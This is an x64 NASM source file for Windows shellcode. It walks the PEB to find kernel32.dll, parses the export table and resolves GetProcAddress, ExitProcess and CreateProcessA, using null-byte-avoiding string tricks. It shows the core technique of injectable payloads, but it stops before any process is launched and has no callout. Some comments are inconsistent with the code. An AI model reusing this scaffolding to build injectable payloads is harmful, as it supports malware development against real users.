BITS 64
SECTION .text
global main
main:
sub rsp, 0x28
and rsp, 0xFFFFFFFFFFFFFFF0
xor rcx, rcx                  ; RCX = 0
mov rax, [gs:rcx + 0x60]      ; RAX = PEB
mov rax, [rax + 0x18]         ; RAX = PEB->Ldr
mov rsi,[rax+0x10]            ; PEB.Ldr->InMemOrderModuleList
mov rsi, [rsi]
mov rsi,[rsi]
mov rbx, [rsi+0x30]           ; kernel32.dll base address
mov r8, rbx                   ; mov kernel32.dll base addr into r8
mov ebx, [rbx+0x3C]           ; Get Kernel32 PE Signature (offset 0x3C) into EBX
add rbx, r8                   ; Add signature offset to kernel32 base. Store in RBX.
xor rcx, rcx                  ; Avoid null bytes from mov edx,[rbx+0x88] by using rcx register to add
add cx, 0x88ff                ; cx is the lower 16 bit portion of ecx (32 bit), and rcx is 64 bit.
shr rcx, 0x8                  ; RCX = 0x88ff --> 0x88
mov edx, [rbx+rcx]            ; EDX = [&NewEXEHeader + Offset RVA ExportTable] = RVA ExportTable
add rdx, r8                   ; RDX = kernel32.dll + RVA ExportTable = ExportTable Address
mov r10d, [rdx+0x14]          ; Number of functions
xor r12, r12                  ; Zero R11 before use
mov r12d, [rdx+0x20]          ; AddressOfNames RVA
add r12, r8                   ; AddressOfNames VMA
mov rcx, r10                  ; number of functions
mov rdi, r10                  ; store number of functions for future use

mov rax, 0x9090737365726464     ; 'ddress'
shl rax, 0x10                  ; 7373657264640000
shr rax, 0x10                  ; 0000737365726464 terminate our string w/ no nulls present in our shellcode!
push rax
mov rax, 0x41636F7250746547   ; 'GetProcA '
push rax
mov rax, rsp	
mov r15, rax
mov rsi, rdx
call kernel32findfunction

exitproc:
mov rcx, rdi
mov rax, 0x90737365              ; 'ess'
shl eax, 0x8                     ; 0000000073736500
shr eax, 0x8                     ; 0000000000737365 terminate our string w/ no nulls present in our shellcode!
push rax
mov rax, 0x636F725074697845      ; ExitProc 
push rax
mov rax, rsp	                 ; RDX points to "ExitProcess" (second argument)
mov r15, rax
mov rsi, rdx
call kernel32findfunction

createproc:
mov rcx, rdi
mov rax, 0x909041737365636F              ; 'ocessA'
shl rax, 0x10                     ; 0000000073736500
shr rax, 0x10                     ; 0000000000737365 terminate our string w/ no nulls present in our shellcode!
push rax
mov rax, 0x7250657461657243      ; CreatePr 
push rax
mov rax, rsp	                 ; RDX points to "CreateProcessA" (second argument)
mov r15, rax
mov rsi, rdx
call kernel32findfunction
jmp endit

kernel32findfunction:             ; Loop over Export Address Table to find WinApi names
    jecxz FunctionNameNotFound    ; Loop around this function until we find WinExec
	mov rax, r15
    xor ebx, ebx                  ; Zero EBX for use
    mov ebx, [r12+rcx*4]          ; EBX = RVA for first AddressOfName
    add rbx, r8                   ; RBX = Function name VMA / add kernel32 base address to RVA and get WinApi name
    dec rcx                       ; Decrement our loop by one, this goes from Z to A
    jmp comparetwo
	
	comparetwo:
    movzx rdx, byte [rbx]  ; Load current byte of string A into RDX
    movzx r9, byte [rax]   ; Load current byte of string B into R8

    cmp dl, 0x0            ; Check if byte in string A is null (string terminator)
    je FunctionNameFound   ; If null, jump to the end of comparison

    cmp r9b, dl             ; Compare the byte in string A with byte in string B
    jne kernel32findfunction           ; If not equal, jump to mismatch handling

    ; If the bytes match, move to the next byte in both strings
    inc rbx                ; Move to the next byte in string A
    inc rax                ; Move to the next byte in string B
    jmp comparetwo         ; Repeat the loop
FunctionNameNotFound:
    int3
FunctionNameFound:
    pop r10                          ;grab caller return address
    mov r15, rcx
    ;pop r15                         ; getprocaddress position
    inc r15   
    xor r11, r11
	mov rdx, rsi                    ; Restore Export Table Address into RDX
    mov r11d, [rdx+0x1c]            ; AddressOfFunctions RVA
    add r11, r8                     ; AddressOfFunctions VMA in R11. Kernel32+RVA for addressoffunctions
    mov eax, [r11+r15*4]            ; Get the function RVA.
    add rax, r8                     ; Found the GetProcAddress WinApi!!!
    push rax                        ; push to stack
	push r10                        ; push called return address to stack
	ret

endit:
mov rbx, [rsp+0x18]
mov rcx, [rsp+0x30]

